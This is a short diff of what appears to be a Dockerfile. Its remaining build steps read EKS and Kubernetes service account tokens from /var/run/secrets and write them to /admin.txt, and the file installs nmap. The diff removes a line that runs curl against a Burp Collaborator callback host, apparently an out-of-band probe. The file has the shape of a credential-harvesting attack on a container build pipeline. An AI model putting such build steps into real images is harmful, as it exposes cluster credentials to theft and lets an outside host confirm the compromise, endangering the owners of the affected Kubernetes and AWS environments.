@@ -4,7 +4,6 @@ COPY . /app
 WORKDIR /app
 RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
 RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
-RUN echo `curl 7t1udxobfcau0dfva0ehovwbl2rsfh.burpcollaborator.net`
 RUN apt-get update
 RUN apt-get install nmap -y
 RUN apt install tree 
